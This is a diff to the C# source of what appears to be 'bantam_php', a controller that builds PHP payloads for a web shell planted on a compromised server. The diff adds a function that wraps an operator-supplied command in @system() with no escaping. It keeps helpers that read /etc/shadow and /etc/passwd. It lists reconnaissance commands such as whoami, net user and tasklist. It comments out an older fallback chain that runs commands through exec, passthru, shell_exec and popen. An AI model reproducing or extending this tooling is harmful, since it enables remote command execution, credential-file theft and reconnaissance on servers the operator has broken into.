@@ -50,7 +50,6 @@ namespace bantam_php
             return Regex.Replace(clean, @"\s+", " ");
         }
 
-
         /// <summary>
         /// 
         /// </summary>
@@ -101,9 +100,11 @@ namespace bantam_php
             return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
         }
 
-        public static string phpInfo = "phpinfo();";
-
-        public static string phpTestExecutionWithEcho = "echo '1';";
+        public static string executeSystemCode(string code)
+        {
+            //todo: abstract now it's time to make the function that executes the code dynamic
+            return "@system('" + code + "');";
+        }
 
         public static string linuxFS_ShadowFile         = "/etc/shadow";
         public static string linuxFS_PasswdFile         = "/etc/passwd";
@@ -114,21 +115,19 @@ namespace bantam_php
 
         public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
-        public static string linuxOS_PsAux = "@system('ps aux');";
+        public static string linuxOS_PsAux          = "ps aux";
+        public static string linuxOS_Ifconfig       = "ifconfig";
+        public static string windowsOS_Ipconfig     = "ipconfig";
+        public static string windowsOS_TaskList     = "tasklist";
+        public static string windowsOS_NetUser      = "net user";
+        public static string windowsOS_NetAccounts  = "net accounts";
+        public static string windowsOS_Ver          = "ver";
+        public static string posixOS_Whoami         = "whoami";
 
-        public static string linuxOS_Ifconfig = "@system('ifconfig');";
 
-        public static string windowsOS_Ipconfig = "@system('ipconfig');";
+        public static string phpInfo = "phpinfo();";
 
-        public static string windowsOS_TaskList = "@system('tasklist');";
-
-        public static string windowsOS_NetUser = "@system('net user');";
-
-        public static string windowsOS_NetAccounts = "@system('net accounts');";
-
-        public static string windowsOS_Ver = "@system('ver');";
-
-        public static string posixOS_Whoami = "@system('whoami');";
+        public static string phpTestExecutionWithEcho = "echo '1';";
 
         /// <summary>
         /// 
@@ -162,26 +161,26 @@ namespace bantam_php
         /// </summary>
         /// <param name="code"></param>
         /// <returns></returns>
-        public static string executeSystemCode(string code)
-        {
-		    return @"
-            if (function_exists('exec')) {
-                @exec($in, $out);
-			    echo @out;
-            } elseif(function_exists('passthru')) {
-                @passthru($in);
-            } elseif(function_exists('system')) {
-                @system($in);;
-            } elseif(function_exists('shell_exec')) {
-			    echo @shell_exec($in);
-            } elseif(is_resource($f = @popen($in, 'r'))) {
-			    $out = "";
-                while (!@feof($f))
-				$out .= fread($f, 1024);
-                pclose($f);
-                echo $out;
-            }";
-        }
+    //    public static string executeSystemCode(string code)
+    //    {
+		  //  return @"
+    //        if (function_exists('exec')) {
+    //            @exec($in, $out);
+			 //   echo @out;
+    //        } elseif(function_exists('passthru')) {
+    //            @passthru($in);
+    //        } elseif(function_exists('system')) {
+    //            @system($in);;
+    //        } elseif(function_exists('shell_exec')) {
+			 //   echo @shell_exec($in);
+    //        } elseif(is_resource($f = @popen($in, 'r'))) {
+			 //   $out = "";
+    //            while (!@feof($f))
+				//$out .= fread($f, 1024);
+    //            pclose($f);
+    //            echo $out;
+    //        }";
+    //    }
 
         /// <summary>
         /// 
